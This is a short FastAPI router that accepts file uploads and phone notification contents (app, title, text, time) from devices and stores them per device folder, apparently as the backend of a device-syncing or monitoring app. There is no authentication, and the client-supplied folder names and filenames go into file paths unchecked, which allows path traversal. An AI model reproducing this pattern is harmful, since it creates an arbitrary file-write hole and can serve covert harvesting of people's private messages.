from fastapi import APIRouter, UploadFile, File, Form
from pathlib import Path
import shutil
from datetime import datetime
from zoneinfo import ZoneInfo

router = APIRouter()

UPLOAD_FOLDER = Path("uploads")
UPLOAD_FOLDER.mkdir(exist_ok=True)


# -----------------------------
# Media Upload
# -----------------------------

@router.post("/upload")
async def upload_file(
    file: UploadFile = File(...),
    relativePath: str = Form(""),
    deviceFolder: str = Form("unknown_device")
):

    relativePath = relativePath.strip("/\\")

    destination_folder = (
        UPLOAD_FOLDER /
        deviceFolder /
        relativePath
    )

    destination_folder.mkdir(
        parents=True,
        exist_ok=True
    )

    destination = destination_folder / file.filename

    with open(destination, "wb") as buffer:
        shutil.copyfileobj(file.file, buffer)

    return {
        "success": True
    }


# -----------------------------
# Notification Upload
# -----------------------------

@router.post("/notification")
async def upload_notification(

    packageName: str = Form(...),
    appName: str = Form(...),
    title: str = Form(""),
    text: str = Form(""),
    time: int = Form(...),
    deviceFolder: str = Form(...)
):

    import json
    import uuid

    notification_folder = (
        UPLOAD_FOLDER /
        deviceFolder /
        "notifications"
    )

    notification_folder.mkdir(
        parents=True,
        exist_ok=True
    )

    # Correct India time
    dt = datetime.fromtimestamp(
        time / 1000,
        ZoneInfo("Asia/Kolkata")
    )

    notification = {
        "packageName": packageName,
        "appName": appName,
        "title": title,
        "text": text,
        "timestamp": time,
        "time": dt.strftime("%d-%m-%Y %H:%M:%S")
    }

    # Unique file for every notification
    filename = (
        f"{time}_{uuid.uuid4().hex[:8]}.json"
    )

    notification_file = (
        notification_folder /
        filename
    )

    notification_file.write_text(
        json.dumps(
            notification,
            ensure_ascii=False,
            indent=2
        ),
        encoding="utf-8"
    )

    return {
        "success": True
    }